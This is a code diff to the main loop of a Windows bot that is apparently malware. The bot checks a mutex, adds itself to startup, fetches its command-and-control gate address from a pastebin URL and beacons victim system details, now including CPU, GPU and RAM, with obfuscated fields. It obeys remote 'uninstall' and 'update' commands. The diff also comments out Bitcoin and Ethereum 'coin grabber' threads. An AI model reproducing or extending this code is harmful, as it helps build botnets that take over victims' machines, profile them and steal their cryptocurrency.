@@ -17,6 +17,7 @@
 #include <wtypes.h>
 #include <comutil.h>
 #include "Helpers.hpp"
+#include "OsHelpers.hpp"
 #pragma comment(lib,"comsuppw.lib")
 #pragma comment( lib, "Urlmon.lib" )
 #pragma comment(lib, "netapi32.lib")
@@ -39,6 +40,8 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 #endif
 		Config config;
 	
+
+
 		//Check if the Bot is Running
 		CreateMutexA(0, FALSE, "Local\\$myprogram$"); // try to create a named mutex
 		if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
@@ -53,6 +56,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 			Helpers::addstartup();
 		}
 
+
 		//Fetch Gate from raw Site
 		http::Request request(config.pastebinUrl);
 		http::Response response = request.send("GET");
@@ -63,8 +67,8 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 		std::string netFramework35 = Helpers::checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5");
 		std::string netFramework4 = Helpers::checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4");
 		// Start Coin Grabber
-		std::thread t1(&CoinFinder::grabBitcoin, CoinFinder());
-		std::thread t2(&CoinFinder::grabEthereum, CoinFinder());
+		//std::thread t1(&CoinFinder::grabBitcoin, CoinFinder());
+		//std::thread t2(&CoinFinder::grabEthereum, CoinFinder());
 		//Main
 		while (true) {
 			try {
@@ -77,6 +81,9 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 					"&nf35=" + encryptDecrypt(netFramework35) +
 					"&nf4=" + encryptDecrypt(netFramework4) +
 					"&av=" + Helpers::getCurrentAv() +
+					"&cpu=" + OsHelpers::getCpuName() +
+					"&gpu=" + OsHelpers::getGpuName() +
+					"&ram=" + OsHelpers::getRam() +
 					"&os=" + Helpers::GetWindowsVersionString() +
 					"&botversion=" + encryptDecrypt("2.0"),
 					{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
@@ -104,18 +111,17 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 						{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
 					);
 					std::cout << started;
-				}
-				else {
+				}else {
 					if (responseFromGate.find("uninstall") != std::string::npos) {
-						t1.detach();
-						t2.detach();
+						//t1.detach();
+						//t2.detach();
 						Helpers::uninstall();
 						return 0;
 					}
 					else if (responseFromGate.find("update") != std::string::npos) {
 						std::vector<std::string> v = Helpers::explode(";", responseFromGate);
-						t1.detach();
-						t2.detach();
+						//t1.detach();
+						//t2.detach();
 						Helpers::update(v[2]);
 						return 0;
 					}
